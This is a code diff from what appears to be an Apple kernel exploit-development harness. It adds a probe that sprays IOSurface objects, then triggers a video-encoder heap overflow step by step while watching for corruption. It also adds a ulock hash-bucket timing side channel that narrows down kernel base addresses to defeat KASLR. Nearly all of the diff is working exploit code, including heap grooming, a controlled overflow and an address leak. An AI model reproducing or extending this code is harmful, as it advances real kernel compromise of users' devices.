@@ -14277,6 +14277,313 @@ static void r339_probe(void) {
     fflush(stdout);
 }
 
+/* r342: Controlled partial overflow + IOSurface property monitor
+ * Part A: Spray IOSurface objects, then lid=3 encodes incrementally
+ *         (280→330 step 5). After each step, read IOSurface properties.
+ *         First change = corruption detected before MTE crash.
+ * Part B: KernelSnitch timing with hash bucket probing */
+static void r342_probe(void) {
+    rlog("\n=== r342: Controlled Partial Overflow + IOSurface Monitor ===\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) return;
+
+    /* ---- Part A: Partial lid=3 overflow with IOSurface monitoring ---- */
+    rlog("--- Part A: Incremental lid=3 overflow with IOSurface property watch ---\n");
+    rlog("  Known: lid=3 ~314 encodes crosses 0xC000 boundary\n");
+    rlog("  Known: ~350 encodes corrupts IOSurface+0xd8 (MTE crash)\n");
+    rlog("  Plan: 280→330 step 5, monitor for pre-crash corruption\n\n");
+    fflush(stdout);
+
+    /* Step 1: Create IOSurface spray first */
+    #define R342_NSURF  200
+    IOSurfaceRef surfs[R342_NSURF];
+    uint32_t surf_ids[R342_NSURF];
+    size_t surf_alloc[R342_NSURF];
+    size_t surf_bpr[R342_NSURF];
+    uint32_t surf_seed[R342_NSURF];
+    uint32_t surf_w[R342_NSURF];
+    uint32_t surf_h[R342_NSURF];
+    int n_surfs = 0;
+
+    rlog("  Spraying %d IOSurface objects...\n", R342_NSURF);
+    fflush(stdout);
+    for (int i = 0; i < R342_NSURF; i++) {
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(
+            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 1920, h = 1080, bpe = 4, bpr = w * bpe;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef en = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        int pf = 0x42475241; /* BGRA */
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        int as = bpr * h;
+        CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
+        CFDictionarySetValue(props, kIOSurfaceWidth, wn);
+        CFDictionarySetValue(props, kIOSurfaceHeight, hn);
+        CFDictionarySetValue(props, kIOSurfaceBytesPerRow, bn);
+        CFDictionarySetValue(props, kIOSurfaceBytesPerElement, en);
+        CFDictionarySetValue(props, kIOSurfacePixelFormat, pfn);
+        CFDictionarySetValue(props, kIOSurfaceAllocSize, asn);
+        surfs[i] = IOSurfaceCreate(props);
+        CFRelease(props); CFRelease(wn); CFRelease(hn);
+        CFRelease(bn); CFRelease(en); CFRelease(pfn); CFRelease(asn);
+        if (!surfs[i]) continue;
+        surf_ids[i] = IOSurfaceGetID(surfs[i]);
+        surf_alloc[i] = IOSurfaceGetAllocSize(surfs[i]);
+        surf_bpr[i] = IOSurfaceGetBytesPerRow(surfs[i]);
+        surf_seed[i] = IOSurfaceGetSeed(surfs[i]);
+        surf_w[i] = (uint32_t)IOSurfaceGetWidth(surfs[i]);
+        surf_h[i] = (uint32_t)IOSurfaceGetHeight(surfs[i]);
+        n_surfs++;
+    }
+    rlog("  Created %d IOSurfaces (IDs %u..%u)\n", n_surfs,
+         n_surfs > 0 ? surf_ids[0] : 0,
+         n_surfs > 0 ? surf_ids[n_surfs-1] : 0);
+    fflush(stdout);
+
+    /* Step 2: Create lid=3 encoder */
+    rlog("\n  Creating lid=3 encoder (3 layers: 0,1,2,3)...\n");
+    fflush(stdout);
+    VTCompressionSessionRef enc3 = create_mvhevc_encoder(1920, 1080, 3);
+    if (!enc3) {
+        rlog("  FAIL: lid=3 encoder creation\n");
+        goto r342_cleanup;
+    }
+    rlog("  Encoder created OK\n");
+    fflush(stdout);
+
+    /* Step 3: Incremental encode + property check */
+    int total_encoded = 0;
+    int corruption_detected = 0;
+    int start_count = 280;
+    int end_count = 335;
+    int step = 5;
+
+    for (int target = start_count; target <= end_count && !corruption_detected; target += step) {
+        int need = target - total_encoded;
+        rlog("\n  [lid=3 x%d] Encoding %d more (total will be %d)...\n",
+             target, need, target);
+        fflush(stdout);
+
+        int ok = 0, err = 0;
+        for (int f = 0; f < need; f++) {
+            int st = encode_one_stereo_lid(enc3, total_encoded + f, 1920, 1080, 3);
+            if (st == 0) ok++;
+            else err++;
+        }
+        total_encoded = target;
+        VTCompressionSessionCompleteFrames(enc3, kCMTimeInvalid);
+        rlog("  Encoded: ok=%d err=%d (total=%d)\n", ok, err, total_encoded);
+        fflush(stdout);
+
+        /* Check all IOSurface properties */
+        rlog("  Checking IOSurface properties...\n");
+        fflush(stdout);
+        int changes = 0;
+        for (int i = 0; i < n_surfs; i++) {
+            if (!surfs[i]) continue;
+            size_t cur_alloc = IOSurfaceGetAllocSize(surfs[i]);
+            size_t cur_bpr = IOSurfaceGetBytesPerRow(surfs[i]);
+            uint32_t cur_seed = IOSurfaceGetSeed(surfs[i]);
+            uint32_t cur_w = (uint32_t)IOSurfaceGetWidth(surfs[i]);
+            uint32_t cur_h = (uint32_t)IOSurfaceGetHeight(surfs[i]);
+
+            if (cur_alloc != surf_alloc[i]) {
+                rlog("  *** CORRUPTION surf[%d] id=%u: allocSize %zu -> %zu ***\n",
+                     i, surf_ids[i], surf_alloc[i], cur_alloc);
+                changes++;
+            }
+            if (cur_bpr != surf_bpr[i]) {
+                rlog("  *** CORRUPTION surf[%d] id=%u: bytesPerRow %zu -> %zu ***\n",
+                     i, surf_ids[i], surf_bpr[i], cur_bpr);
+                changes++;
+            }
+            if (cur_w != surf_w[i]) {
+                rlog("  *** CORRUPTION surf[%d] id=%u: width %u -> %u ***\n",
+                     i, surf_ids[i], surf_w[i], cur_w);
+                changes++;
+            }
+            if (cur_h != surf_h[i]) {
+                rlog("  *** CORRUPTION surf[%d] id=%u: height %u -> %u ***\n",
+                     i, surf_ids[i], surf_h[i], cur_h);
+                changes++;
+            }
+            if (cur_seed != surf_seed[i]) {
+                rlog("  *** CORRUPTION surf[%d] id=%u: seed %u -> %u ***\n",
+                     i, surf_ids[i], surf_seed[i], cur_seed);
+                changes++;
+            }
+        }
+        rlog("  Properties checked: %d changes detected\n", changes);
+        fflush(stdout);
+        if (changes > 0) {
+            corruption_detected = 1;
+            rlog("  !!! CORRUPTION DETECTED AT %d ENCODES !!!\n", total_encoded);
+        }
+    }
+
+    if (!corruption_detected) {
+        rlog("\n  No property corruption detected through %d encodes.\n", total_encoded);
+        rlog("  Overflow may hit pointer fields (MTE-checked) before integer fields.\n");
+        rlog("  Or IOSurface objects are not adjacent to VPS table in this run.\n");
+    }
+
+    VTCompressionSessionInvalidate(enc3);
+    CFRelease(enc3);
+
+r342_cleanup:
+    for (int i = 0; i < R342_NSURF; i++) {
+        if (surfs[i]) CFRelease(surfs[i]);
+    }
+
+    /* ---- Part B: KernelSnitch hash bucket timing ---- */
+    rlog("\n--- Part B: KernelSnitch Hash Bucket Timing ---\n");
+    rlog("  Mapping loaded hash buckets via ulock_wake timing\n");
+    fflush(stdout);
+
+    uint32_t my_pid = getpid();
+    uint32_t table_sz = 1024;
+
+    /* Allocate probe pages */
+    size_t probe_sz = 4096 * 2048;
+    void *pbase = mmap(NULL, probe_sz, PROT_READ | PROT_WRITE,
+                       MAP_ANON | MAP_PRIVATE, -1, 0);
+    if (pbase == MAP_FAILED) {
+        rlog("  mmap failed\n");
+        goto r342_done;
+    }
+
+    /* Step 1: Build a map from bucket → user address */
+    rlog("  Building bucket→addr map (table_sz=%u)...\n", table_sz);
+    fflush(stdout);
+    uint64_t bucket_addrs[1024];
+    memset(bucket_addrs, 0, sizeof(bucket_addrs));
+    int mapped = 0;
+    for (size_t off = 0; off < probe_sz && mapped < (int)table_sz; off += 4096) {
+        uint64_t addr = (uint64_t)pbase + off;
+        uint32_t b = snitch_ull_hash(my_pid, addr, table_sz);
+        if (bucket_addrs[b] == 0) {
+            bucket_addrs[b] = addr;
+            mapped++;
+        }
+    }
+    rlog("  Mapped %d / %u buckets to user addresses\n", mapped, table_sz);
+    fflush(stdout);
+
+    /* Step 2: Baseline timing (empty bucket wake) */
+    uint64_t bl_sum = 0;
+    int bl_n = 0;
+    for (int i = 0; i < 100; i++) {
+        uint64_t addr = bucket_addrs[i % table_sz];
+        if (!addr) continue;
+        volatile uint32_t *lk = (volatile uint32_t *)addr;
+        *lk = 1;
+        uint64_t t0 = mach_absolute_time();
+        syscall(516, UL_COMPARE_AND_WAIT | ULF_NO_ERRNO, lk, 0, 0, 0);
+        uint64_t t1 = mach_absolute_time();
+        if (i >= 20) { bl_sum += (t1 - t0); bl_n++; }
+    }
+    double bl_avg = (bl_n > 0) ? (double)bl_sum / bl_n : 1.0;
+    rlog("  Baseline (empty wake): %.1f ticks (n=%d)\n", bl_avg, bl_n);
+    fflush(stdout);
+
+    /* Step 3: Load specific buckets with 64 waiters, then time */
+    rlog("  Timing loaded buckets (64 waiters each)...\n");
+    fflush(stdout);
+
+    #define R342_PROBE_BUCKETS 64
+    #define R342_WAITERS       64
+    #define R342_TIMING_REPS   10
+
+    double bucket_ratios[R342_PROBE_BUCKETS];
+    for (int bi = 0; bi < R342_PROBE_BUCKETS; bi++) {
+        uint32_t target_bucket = (uint32_t)(bi * (table_sz / R342_PROBE_BUCKETS));
+        uint64_t addr = bucket_addrs[target_bucket];
+        if (!addr) { bucket_ratios[bi] = 0; continue; }
+
+        volatile uint32_t *lk = (volatile uint32_t *)addr;
+        *lk = 0;
+
+        /* Pile up waiters */
+        pthread_t wtids[R342_WAITERS];
+        struct snitch_waiter_arg wargs[R342_WAITERS];
+        for (int w = 0; w < R342_WAITERS; w++) {
+            wargs[w].addr = lk;
+            wargs[w].done = 0;
+            pthread_create(&wtids[w], NULL, snitch_waiter_thread, &wargs[w]);
+        }
+        usleep(30000);
+
+        /* Time wake */
+        uint64_t tsum = 0;
+        for (int r = 0; r < R342_TIMING_REPS; r++) {
+            uint64_t t0 = mach_absolute_time();
+            syscall(516, UL_COMPARE_AND_WAIT | ULF_NO_ERRNO, lk, 0, 0, 0);
+            uint64_t t1 = mach_absolute_time();
+            tsum += (t1 - t0);
+        }
+        double avg = (double)tsum / R342_TIMING_REPS;
+        bucket_ratios[bi] = avg / bl_avg;
+
+        /* Wake and join */
+        *lk = 1;
+        for (int w = 0; w < R342_WAITERS; w++)
+            syscall(516, UL_COMPARE_AND_WAIT | ULF_NO_ERRNO, lk, 0, 0, 0);
+        usleep(5000);
+        for (int w = 0; w < R342_WAITERS; w++)
+            pthread_join(wtids[w], NULL);
+    }
+
+    /* Report */
+    rlog("\n  Bucket timing ratios (vs baseline):\n");
+    int high_ct = 0;
+    double max_ratio = 0;
+    int max_bucket = -1;
+    for (int bi = 0; bi < R342_PROBE_BUCKETS; bi++) {
+        uint32_t b = (uint32_t)(bi * (table_sz / R342_PROBE_BUCKETS));
+        if (bi % 8 == 0) rlog("  ");
+        rlog("[%3u]%5.1fx ", b, bucket_ratios[bi]);
+        if (bi % 8 == 7) rlog("\n");
+        if (bucket_ratios[bi] > 3.0) high_ct++;
+        if (bucket_ratios[bi] > max_ratio) { max_ratio = bucket_ratios[bi]; max_bucket = b; }
+    }
+    rlog("\n  High-ratio buckets (>3x): %d / %d\n", high_ct, R342_PROBE_BUCKETS);
+    rlog("  Max ratio: %.1fx at bucket %d\n", max_ratio, max_bucket);
+    fflush(stdout);
+
+    /* Step 4: For high-ratio buckets, find which kernel slide candidates match */
+    if (high_ct > 0 && high_ct < 10) {
+        rlog("\n  Checking kernel slide candidates for high-ratio buckets...\n");
+        fflush(stdout);
+        uint64_t kbase_lo = 0xfffffe0036000000ULL;
+        uint64_t kbase_hi = 0xfffffe0042000000ULL;
+        uint64_t kstep    = 0x0000000000200000ULL; /* 2MB */
+        for (int bi = 0; bi < R342_PROBE_BUCKETS; bi++) {
+            if (bucket_ratios[bi] <= 3.0) continue;
+            uint32_t b = (uint32_t)(bi * (table_sz / R342_PROBE_BUCKETS));
+            rlog("  High bucket %u (%.1fx): kernel candidates with pid=0:\n    ", b, bucket_ratios[bi]);
+            int cnt = 0;
+            for (uint64_t kb = kbase_lo; kb < kbase_hi; kb += kstep) {
+                uint32_t kb_hash = snitch_ull_hash(0, kb, table_sz);
+                if (kb_hash == b) {
+                    rlog("0x%llx ", kb);
+                    cnt++;
+                    if (cnt >= 8) { rlog("..."); break; }
+                }
+            }
+            rlog("\n");
+        }
+    }
+
+    munmap(pbase, probe_sz);
+
+r342_done:
+    rlog("\n=== r342 complete ===\n");
+    fflush(stdout);
+}
+
 /* r341: Extended overflow + lid sweep + KASLR timing
  * Part A: Stress lid=1 at 500,750,1000 encodes to push overflow further
  * Part B: Try lid=2 (may overflow more per encode)
@@ -46832,6 +47139,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 345) {
+            rlog("*** rounds=345: Controlled Partial Overflow ***\n");
+            rlog("  r341: lid=1 survives 500+, lid=2 survives 400 (no crash)\n");
+            rlog("  r342: Partial lid=3 overflow + IOSurface property monitor\n\n");
+            r342_probe();
             goto done;
         }
         if (rounds == 344) {
